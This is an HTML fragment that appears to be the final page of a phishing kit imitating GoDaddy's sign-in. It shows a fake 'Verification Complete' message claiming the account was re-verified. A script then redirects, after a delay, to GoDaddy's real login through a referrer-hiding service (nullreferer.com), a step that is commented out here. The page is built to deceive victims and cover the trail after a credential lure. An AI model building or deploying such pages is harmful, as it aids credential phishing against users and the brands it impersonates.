                                                ...
                                                <div class="card-block  idp ">
                                                    <div id="form-header" class="idp-form-header">
                                                        <div id="brand-header-template" class="remove-login-header">
                                                            ...
                                                            <div id="title">
                                                                <h1 id="h3">Verification Complete</h1>
            <div style="margin: .75rem 0;" align="center">
                <img style="height: 125px;" src="images/verifyi.jpg" alt="">
            </div>
            <span style="font-size: 1rem;">
                Your account has successfully been re-verified.
                <br>
                You will now be redirected back to our login page.
            </span>
                                                            </div>
                                                        </div>
                                                    </div>
...
<script>
    setTimeout(() => {
//       window.location.href = 'https://nullreferer.com/?https://sso.godaddy.com/';
    }, 3500);
</script>
</html>